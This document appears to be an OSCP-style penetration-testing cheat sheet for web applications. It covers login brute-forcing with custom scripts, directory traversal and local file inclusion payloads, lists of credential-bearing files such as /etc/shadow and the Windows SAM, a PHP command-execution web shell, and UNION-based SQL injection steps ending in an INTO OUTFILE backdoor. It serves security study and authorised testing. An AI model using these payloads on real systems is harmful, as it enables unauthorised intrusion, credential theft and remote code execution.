# Brute Force Login Screens
- Generally doesn't work but should be tried anyways in case it's low hanging fruit. 
- It is more likely to be successful if we already have some usernames that will likely work. 
- General usernames and passwords should also be tried but we can't have this list be too long because it will take time. 

1. Turn on proxy (Burp or ZAP) and capture requests. 
2. Attempt a general login. 
3. Look at the request being sent to identify the method (GET or POST) to send the authentication credentials as well as the variable name for the username and password.
4. See what keyword is displayed upon a failed login attempt.
5. Create or use a list of usernames to attempt brute force login. [Default Username List](https://github.com/neogeo56/OSCP/blob/master/Web/Brute_Force/Default-Usernames.txt)
6. Create or use a list of passwords to attempt brute force login. [Default Password List](https://github.com/neogeo56/OSCP/blob/master/Web/Brute_Force/rockyou-20.txt)
7. Create a colon-seperated file of username and password combinations using the [UserPass_List_Maker.py](https://github.com/neogeo56/OSCP/blob/master/Web/Brute_Force/UserPass_List_Maker.py)
```
python3 UserPass_List_Maker.py [user list] [password list]
```
- Creates the colon-seperated file "User_Pass.txt" in the directory the script was run from.
8. Brute force login screen with [Web_Brute_Force_2.py](https://github.com/neogeo56/OSCP/blob/master/Web/Brute_Force/Web_Brute_Force_2.py) python script.
```
python3 Web_Brute_Force_2.py -f/--file [colon seperated username:password file] -U/--URL [URL to the web application login form] -k/--keyword [Keyword in the HTML used to identify failed login attempts] -uP [HTTP parameter that passes the username] -pP [HTTP parameter that passes the password] -o [outfile location]
```

# Local File Inclusion Test

## Evaluate Open Home Directories
Apache by default creates a home directory for each user account and sometimes these home directories are accessible through web page navigation. 
1. Compile a listing of usernames or guessed usernames. 
2. In the web browser just attempt accessing home directories: 
```
[IP Address / Hostname]/~[username]
```

## Directory Traversal
In areas of the application where we see directories hardcoded into the web address bar, we should try directory traversal attacks to see if we can navigate to any file on the system. 
### Xnix 
```
Http(s)://[web address]?[variable]=../../../../../../../../../../../../../../../../../[file location like etc/passwd or etc/resolve.conf]
```
- Try with no extension and then try with common extensions like .htm or .html or .txt 
- Also try to delete pre-filled extensions (txt, php, etc.) to see if we can get a verbose error message to pull threads on. 
### ISS / Windows 
```
Http(s)://[web address]?[variable]=../../../../../../../../../../../../../../../../../[file location like \%systemroot%\system32\config] 
```
### Valuable File Locations To Read w/ LFI
- SSH Key locations if Port 22 is open. 
```
Var/log/auth.log 
```
- OS files for passwords. 
```
/etc/passwd
```
```
/etc/shadow
```
  - Generally can't read this unless the permissions to it are missconfigured.  If we can read this then we usually can read anything and it's over.
- Log poisoning
```
var/log/apace2/access.log
```
- Windows Files
```
%windir%\repair\sam 
%windir%\System32\config\RegBack\SAM 
%windir%\repair\system 
%windir%\repair\software 
%windir%\repair\security 
%windir%\debug\NetSetup.log (AD domain name, DC name, internal IP, DA account) 
%windir%\iis6.log (5,6 or 7) 
%windir%\system32\logfiles\httperr\httperr1.log 
C:\sysprep.inf 
C:\sysprep\sysprep.inf 
C:\sysprep\sysprep.xml 
%windir%\Panther\Unattended.xml 
C:\inetpub\wwwroot\Web.config 
%windir%\system32\config\AppEvent.Evt (Application log) 
%windir%\system32\config\SecEvent.Evt (Security log) 
%windir%\system32\config\default.sav 
%windir%\system32\config\security.sav 
%windir%\system32\config\software.sav 
%windir%\system32\config\system.sav 
%windir%\system32\inetsrv\config\applicationHost.config 
%windir%\system32\inetsrv\config\schema\ASPNET_schema.xml 
%windir%\System32\drivers\etc\hosts (dns entries) 
%windir%\System32\drivers\etc\networks (network settings) 
%windir%\system32\config\SAM (only really useful if you have access to the files while the machine is off) 
```

## Read Remote System PHP File Source
1. Attempt a PHP wrapper function around a PHP file location we know renders in the webpage to identify if the PHP is vulnerable to leaking PHP source code.
```
...?[variable]=php://filter/convert.base64-encode/resource=[known file location that renders]
```
  - You shouldn't include the PHP extension in the URL because this command can only execute on php extension files of the web server because you are abusing a PHP command already.
2. If successful, the base64 output of the PHP file is shown, which we can then copy to our attacker box and decode to read the plaintext version of any PHP file.

### Identify any PHP 'include' Functions
- The 'include()' function in PHP code is used to open files based on user input / variables.
- This function is commonly used insecurely in that if input is not sanitized appropriately, a user can force the web browser to automatically execute any PHP code that they point the web browser to on the target box.
- If we can upload a PHP reverse shell to any location on the target box, we can abuse the 'include()' function LFI to execute the reverse shell back to our attacker machine.
  - A simple PHP command injection file that we can create allows us to input whatever command we want into an HTTP request to have it executed as long as another part of the HTTP request is navigating to this PHP file on the web server box and abusing the 'include' functionality.
  ```
  <?php echo system ($_REQUEST['neogeo']); ?>
  ```
  ```
  GET /?neogeo=[cmd]
  ```
  - A reliable PHP reverse shell can be found here [PHP Reverse Shell](https://github.com/neogeo56/OSCP/blob/master/Shells/php-reverse-shell.php).  Note that you have to adjust the IP and port variables in the shell before executing.
  
# Manual SQL Injection Testing
- Syntax varies between DB types - cheat sheets available here: http://pentestmonkey.net/category/cheat-sheet/sql-injection 
1. Identify areas in the application that could be inputs for SQLi in the URL (id=1). 
2. Proxy through ZAP to try [SQLi Test Payloads](https://github.com/neogeo56/OSCP/blob/master/Web/SQLi_Tests_Plaintext) to see instances where the payload doesn't result in an error on the page (the website is processing the SQLi payload correctly to result in TRUE condition). 
3. Identify the number of columns in the current table by adding an additional value for each request (1 then 1,2 then 1,2,3).
```
.... ORDER BY 1,2,3,4,5,6.... 
```
4. Once you get to a number that results in an error on the page, the total number of columns is less than the number that resulted in the error (if it errored out on 7, then there are 6 columns in the current table).
5. Identify which columns show information on the screen. 
```
... UNION ALL SELECT 1,2,3,4,5,6 
```
- Which numbers of 1 - 6 show on the page is where we are going to put the query part of the payload (We'll use 3 for rest of example) 
6. Fingerprint the DB 
```
... UNION ALL SELECT 1,2,[version payload],4,5,6 
```
7. Identify current user you're issuing commands for 
```
.... UNION ALL SELECT 1,2,[current user payload],4,5,6 
```
8. List the current datbase you're working in 
```
... UNION ALL SELECT 1,2,[current database payload],4,5,6 
```
9. List all of the databases available in the current view (assuming MySQL for the rest - check cheat sheet for syntax) 
```
... UNION ALL SELECT 1,2,[schema_name],4,5,6 FROM [information_schema.schemata] 
```
10. List the tables available in the current database 
```
... UNION ALL SELECT 1,2,[table_name],4,5,6 FROM [information_schema.tables] 
```
11. Identify a table of interest that has account information. Then list the columns available in the that table 
'''
... UNION ALL SELECT 1,2,[column_name],4,5,6 FROM [information_schema.columns] WHERE [table_name=[table of interest]] 
'''
  - Note that you might have to convert the table name to ASCII Character values to make this work. char(65,66,67) means ABC 
12. Output the contents of columns from a table. 
```
... UNION ALL SELECT 1,2,[column_name],4,5,6 FROM [table of interest] 
```
13. PHP reverse shell attempt 
```
union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php' 
```
14. Load File Attempt 
```
union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6 
```
